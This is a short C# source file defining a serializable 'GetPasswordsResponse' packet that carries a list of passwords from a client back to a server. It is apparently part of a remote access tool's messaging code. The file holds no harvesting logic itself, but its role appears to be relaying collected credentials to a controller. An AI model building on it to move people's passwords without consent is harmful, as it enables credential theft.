using System.Collections.Generic;
using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetPasswordsResponse : IPacket
    {
        public List<string> Passwords { get; set; }

        public GetPasswordsResponse()
        {
        }

        public GetPasswordsResponse(List<string> data)
        {
            this.Passwords = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}